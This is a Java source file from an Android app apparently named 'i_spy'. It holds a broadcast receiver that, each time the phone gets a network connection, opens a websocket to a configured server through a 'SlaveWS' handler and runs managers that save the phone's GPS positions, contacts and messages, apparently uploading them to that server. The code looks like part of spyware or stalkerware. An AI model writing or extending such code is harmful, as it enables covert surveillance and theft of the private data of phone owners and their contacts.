package com.um.asn.i_spy.listeners;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

import com.um.asn.i_spy.Config;
import com.um.asn.i_spy.managers.ContactManager;
import com.um.asn.i_spy.managers.MessageManager;
import com.um.asn.i_spy.managers.PositionGPSManager;
import com.um.asn.i_spy.models.Phone;
import com.um.asn.i_spy.websockets.SlaveWS;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.WebSocket;

public class ConnectionListener extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent)
    {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService( Context.CONNECTIVITY_SERVICE );
        NetworkInfo activeNetInfo = connectivityManager.getActiveNetworkInfo();
        if (activeNetInfo != null && activeNetInfo.isConnected())
        {
            System.out.println("Connected !");

            // Démarre la WebSocket
            OkHttpClient client = new OkHttpClient();
            Request request = new Request.Builder().url(Config.SERVER_WS).build();
            SlaveWS listener = new SlaveWS(context);
            WebSocket ws = client.newWebSocket(request, listener);
            client.dispatcher().executorService().shutdown();

            Phone phone = new Phone();
            phone.loadWithFile(context);

            System.out.println("Try save Position");
            PositionGPSManager posGPS = new PositionGPSManager(context, phone);
            posGPS.insertDistFromLocal();

            System.out.println("Try save contacts");
            ContactManager contact = new ContactManager(context, phone);
            contact.run();

            System.out.println("Try save messages");
            MessageManager message = new MessageManager(context, phone);
            message.run();
        }
        else{
            System.out.println("Disconnected !");
        }
    }

}
